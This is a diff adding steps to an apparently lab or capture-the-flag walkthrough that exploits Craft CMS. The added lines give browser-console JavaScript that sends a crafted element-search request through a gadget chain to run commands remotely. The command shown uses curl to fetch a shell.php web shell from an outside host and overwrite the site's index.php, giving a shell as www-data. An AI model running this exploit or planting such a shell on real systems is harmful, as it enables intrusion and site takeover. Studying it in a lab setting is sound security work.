@@ -127,4 +127,28 @@ First create a shell.php file, with the following contents:
 
 ````
 
-Then press Ctrl+Shift+J
+Then press Ctrl+Shift+J, go to console, and paste the code above, after typing "allow pasting":
+````
+(async () => {
+  const csrf = window.Craft.csrfTokenValue;
+  const fire = (cmd) => {
+    const b = { elementType: "craft\\elements\\Category", siteId: 1, search: "",
+      condition: { class: "craft\\elements\\conditions\\ElementCondition", elementType: "craft\\elements\\Category",
+        fieldLayouts: [ { "as rce": { "__class": "yii\\behaviors\\AttributeTypecastBehavior",
+          "__construct()": [ { attributeTypes: { typecastBeforeSave: ["Psy\\Readline\\Hoa\\ConsoleProcessus","execute"] },
+          typecastBeforeSave: cmd } ] }, "on *": "self::beforeSave" } ] } };
+    const url='/index.php?p=admin/actions/element-search/search';
+    const t0 = performance.now();
+    return fetch(url,{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json','X-CSRF-Token':csrf},body:JSON.stringify(b)})
+      .then(r=>r.text().then(t=>({status:r.status, ms: Math.round(performance.now()-t0), head:t.slice(0,60)})));
+  };
+  const timed = await fire("curl http://10.13.37.182:8000/shell.php --output /var/www/portal/web/index.php");
+  return JSON.stringify({timed});
+})()
+````
+This command is going to upload your shell.php into the website and substitute index.php for it:
+
+<img width="997" height="717" alt="image" src="https://github.com/user-attachments/assets/3973ea4a-a5d1-4e14-9e50-5b602d619096" />
+
+Now we have shell as www-data
+
